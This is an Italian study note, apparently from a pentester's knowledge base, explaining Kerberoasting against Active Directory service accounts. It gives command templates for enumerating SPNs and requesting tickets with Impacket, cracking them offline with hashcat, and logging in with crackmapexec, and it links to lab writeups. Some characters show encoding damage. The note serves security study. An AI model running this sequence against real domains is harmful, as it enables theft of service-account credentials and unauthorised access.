#Privesc_AD 

---
#### INDICE

- [[#Introduzione]]
- [[#Exploit]]

---
---
---
### Introduzione
**Kerberoasting** Ã¨ una tecnica di raccolta e sfruttamento di credenziali che prende di mira account di servizio in Active Directory identificati da un[[ğŸ”¡ Glossario#Service Principal Name | Service Principal Name (SPN)Â°]]. Lâ€™attaccante richiede ticket di servizio Kerberos (TGS) per quei SPN, estrae la parte cifrata del ticket e tenta di forzarne la password offline. Ãˆ una tecnica che sfrutta proprietÃ  del protocollo Kerberos e la forza o debolezza delle password degli account di servizio.

---
### Exploit
Tramite l'aiuto di [impacket](https://github.com/fortra/impacket?tab=readme-ov-file#getting-impacket) enumeriamo gli account SPN:

```
GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME]
```

Per chiedere un TGS specifico:

```
GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request-user [SPN-USERNAME] -outputfile [OUTPUT-FILE]
```

Per craccare il TGS appena ottenuto:

```
hashcat -m 13100 [TGS-FILE] /usr/share/wordlists/rockyou.txt
```

Infine effettuiamo l'accesso:

```
crackmapexec smb [DC-IP] -u [USERNAME] -p [PASSWORD]
```

ğŸ“šâ€‹ Writeups:
- [[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Nagoya]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Access]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Enterprise]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Hokkaido]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory | Breach]][[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Breach]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Attacktive Directory]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Hutch]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Active]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Forest]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory| Administrator]],